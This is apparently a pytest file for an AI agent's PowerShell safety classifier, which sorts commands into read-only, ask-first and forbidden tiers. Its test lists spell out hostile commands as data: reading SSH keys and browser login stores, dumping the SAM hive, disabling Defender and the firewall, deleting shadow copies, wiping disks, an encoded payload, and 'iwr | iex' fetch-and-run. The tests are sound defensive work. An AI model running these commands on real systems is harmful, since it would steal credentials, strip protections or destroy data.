"""PowerShell-Einstufung (Windows). Reine Textprüfung, läuft daher auch unter Linux."""

import pytest

from aura_agent.harness.tiers import Tier
from aura_agent.policy.powershell_classifier import classify_powershell as classify

READ = [
    "Get-ChildItem ~/Downloads", "dir C:\\Users\\sebastian\\Documents", "ls -Force", "Get-Content ~/notizen.txt",
    "Get-ChildItem -Path ~ -Recurse -Filter *.pdf | Select-Object FullName, Length -First 20",
    "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU",
    "Get-Process | Where-Object { $_.CPU -gt 10 -and $_.Name -like 'chr*' }",
    "Get-ChildItem ~ -Recurse | Where-Object { $_.Length -gt 100MB } | Sort-Object Length",
    "gps | ? {$_.Name -eq 'chrome'} | measure", "Get-Service | Where-Object Status -eq 'Running'",
    "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version",
    "Get-Volume", "Get-NetIPAddress -AddressFamily IPv4", "ipconfig /all", "ipconfig", "systeminfo",
    "tasklist", "whoami", "hostname", "nvidia-smi", "ollama list", "git status", "git log --oneline -5",
    "winget list", "Get-StartApps | Where-Object { $_.Name -like '*Chrome*' }", "Test-Path ~/Desktop/x.txt",
    "Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize",
    "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Get-Date -Format 'dd.MM.yyyy'",
    "Get-ChildItem $env:USERPROFILE\\Downloads | Measure-Object -Property Length -Sum",
    "Select-String -Path ~/Documents/*.txt -Pattern 'Rechnung'", "Get-ChildItem ~ 2>$null",
    "Get-WinEvent -LogName System -MaxEvents 20 | Format-Table -AutoSize", "Get-Clipboard",
    "Get-Process | ForEach-Object { $_.Name }", "Get-ChildItem | Format-List Name, LastWriteTime",
]

ASK = [
    "Stop-Process -Name chrome", "Get-Process chrome | Stop-Process", "Remove-Item ~/test.txt", "rm ~/test.txt",
    "del C:\\Users\\x\\a.txt", "Move-Item a b", "Copy-Item a b", "Set-Content ~/x.txt 'hi'", "'hi' > ~/x.txt",
    "Get-Process | Out-File p.txt", "Invoke-WebRequest https://example.com", "iwr https://x | iex",
    "Invoke-Expression 'Get-Process'", "curl https://example.com", "Start-Process notepad",
    "Start-Process powershell -Verb RunAs", "winget install vlc", "choco install vlc", "pip install requests",
    "git push", "Get-ChildItem; Remove-Item x", "Get-ChildItem && rm x", "Get-ChildItem | ForEach-Object { Remove-Item $_ }",
    "Get-ChildItem | ForEach-Object { $_.Delete() }", "(Get-Item x).Delete()", "[IO.File]::WriteAllText('x', 'y')",
    "Get-Content \"$(Remove-Item x)\"", "$x = 5", "& 'C:\\tools\\app.exe'", ".\\setup.exe", "C:\\tools\\ls.exe",
    "Set-ItemProperty HKCU:\\Software\\X -Name a -Value 1", "reg add HKCU\\Software\\X /v a /d 1",
    "sc stop wuauserv", "ipconfig /release", "Restart-Computer", "Stop-Computer", "shutdown /s /t 0",
    "Get-Service -ComputerName server1", "cmd /c del x", "python script.py", "node app.js", "", "  ",
    "Get-ChildItem `\n; rm x", "Get-ChildItem ‘x’", "Get-Process | Where-Object { Remove-Item x }",
    "Get-ChildItem | Where-Object { $_.Name -like 'a' } | Remove-Item", "New-Item -ItemType File x.txt -Value hi",
]

FORBIDDEN = [
    "Get-Content ~/.ssh/id_rsa", "type C:\\Users\\x\\.ssh\\id_ed25519", "cmdkey /list", "Get-Credential",
    "Get-ChildItem $env:APPDATA\\Microsoft\\Credentials", "Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data' C:\\tmp",
    "Get-Content $env:APPDATA\\Aura\\secrets.json", "reg save HKLM\\SAM C:\\sam.hive", "Set-MpPreference -DisableRealtimeMonitoring $true",
    "netsh advfirewall set allprofiles state off", "Set-ExecutionPolicy Unrestricted", "bcdedit /set testsigning on",
    "vssadmin delete shadows /all", "format D:", "diskpart", "Clear-Disk -Number 1 -RemoveData",
    "Remove-Item -Recurse -Force C:\\", "rm -r -fo ~", "Remove-Item -Recurse $env:USERPROFILE", "rd /s /q C:\\Windows",
    "Remove-Item -Recurse 'C:\\Program Files'", "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name EnableLUA -Value 0",
]


@pytest.mark.parametrize("cmd", READ)
def test_read_only_commands_run_without_asking(cmd):
  assert classify(cmd)[0] == Tier.T0, classify(cmd)


@pytest.mark.parametrize("cmd", ASK)
def test_changing_or_unknown_commands_ask(cmd):
  assert classify(cmd)[0] == Tier.T2, classify(cmd)


@pytest.mark.parametrize("cmd", FORBIDDEN)
def test_credentials_security_and_destruction_are_forbidden(cmd):
  assert classify(cmd)[0] == Tier.T3, classify(cmd)


@pytest.mark.parametrize("cmd", ["mkdir ~/Projekte/neu", "New-Item -ItemType Directory ~/neu", "md C:\\Users\\x\\neu",
                                 "Start-Process https://music.youtube.com", "start 'https://www.wetter.de'"])
def test_create_folder_and_open_website_are_t1(cmd):
  assert classify(cmd)[0] == Tier.T1, classify(cmd)


def test_deleting_inside_home_is_t2_not_t3():
  assert classify("Remove-Item ~\\Downloads\\alt.zip")[0] == Tier.T2


def test_reason_names_the_command():
  tier, reason = classify("Stop-Process -Name chrome")
  assert tier == Tier.T2 and "Stop-Process" in reason


# AURA-13: Umgebungsvariablen (können Schlüssel enthalten) und Programme mit weiteren, ausführenden Argumenten.
PS_BYPASSES = [
    "$env:GEMINI_API_KEY", "Write-Output $env:GITHUB_TOKEN", "Get-ChildItem env:", "gci Env:\\", "dir env:",
    "Get-Item env:GEMINI_API_KEY", "Get-Content env:PATH", "Get-ItemProperty HKCU:\\Environment",
    "Get-CimInstance Win32_Environment", "wsl -l -e id", "wsl --list -- id", "node -v -e 1", "python --version -c 1",
    "py -0 -c 1", "pwsh -v -Command x", "git branch -D main", "git log --output=x", "git remote add x https://e.example",
    "arp -a -d 10.0.0.1",
]

PS_STILL_READ_ONLY = [
    "Get-ChildItem $env:USERPROFILE\\Downloads", "Test-Path $env:APPDATA\\Code", "wsl -l -v", "wsl --status",
    "python --version", "node -v", "py --list", "git remote -v", "git branch -a", "git status", "arp -a",
]


@pytest.mark.parametrize("cmd", PS_BYPASSES)
def test_env_reads_and_extra_arguments_ask(cmd):
  assert classify(cmd)[0] == Tier.T2, classify(cmd)


@pytest.mark.parametrize("cmd", PS_STILL_READ_ONLY)
def test_harmless_forms_stay_read_only_powershell(cmd):
  assert classify(cmd)[0] == Tier.T0, classify(cmd)
